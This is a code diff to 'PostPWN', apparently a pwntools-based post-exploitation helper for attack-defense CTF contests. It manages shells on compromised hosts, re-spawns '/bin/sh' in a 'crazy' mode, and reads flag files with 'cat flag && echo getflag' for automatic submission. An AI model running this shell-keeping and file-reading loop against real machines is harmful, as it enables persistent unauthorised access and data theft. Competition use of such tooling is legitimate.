@@ -13,19 +13,26 @@ class PostPWN(threading.Thread):
     Usage: 
     def submit(flag):
         ...
-    PostPWN([remote_object,], submit)
+
+    r = PostPWN([remote_object,], submit)
+    r.append(shell)
+    r.main()
     """
-    def __init__(self, shells,submit_function=None):
+    def __init__(self, shells=[],submit_function=None,crazy=False):
         """shell: the remote shells from pwntools"""
         # args: [remote1, remote2, ...]
         threading.Thread.__init__(self)
         self.shells=shells
+        self.crazy=crazy
         if submit_function:
             self.submit_function=submit_function
         else:
             self.submit_function=self.empty_func_error
         self.start()
-        self.main()
+        # self.main()
+
+    def append(self,shell):
+        self.shells.append(shell)
 
     def main(self):
         # a menu to do sth
@@ -82,16 +89,18 @@ class PostPWN(threading.Thread):
     def deamon(self):
         print("\033[37mActive ip: \033[32m%s \033[37m"%str([shell.rhost for shell in self.shells]))
         for shell in self.shells:
-            shell.sendline("/bin/sh")
-            shell.recvrepeat(1) #fix recv bugs
-            shell.sendline("echo isActive")
-            # shell.sendline("bin_name")
-            if "isActive" in shell.recv():
-                continue
+            if not self.crazy:
+                shell.sendline("/bin/sh")
+                shell.recvrepeat(0.5) #fix recv bugs
+                shell.sendline("echo isActive")
+                if "isActive" in shell.recv():
+                    continue
+                else:
+                    self.shells.remove(shell)
+                    info("IP: \033[31m%s:%d \033[38mis not active"%(shell.rhost,shell.rport))
             else:
-                self.shells.remove(shell)
-                info("IP: \033[31m%s:%d \033[38mis not active"%(shell.rhost,shell.rport))
-        sleep(20)
+                shell.sendline("/bin/sh")
+        sleep(1 if self.crazy else 20)
 
     def get_flag(self):
         flags=[]
@@ -99,8 +108,9 @@ class PostPWN(threading.Thread):
             shell.recvrepeat(0.5) #fix recv bugs
             shell.sendline("echo getflag")
             shell.recvuntil("getflag\n")
-            shell.sendline("cat flag")
-            flags.append(shell.recvline()[:-1])
+            shell.sendline("cat flag && echo getflag")
+            # if flag have '\n'
+            flags.append(shell.recvuntil("getflag",drop=True)[:-1])
         return flags
 
     def empty_func_error(self,pad):
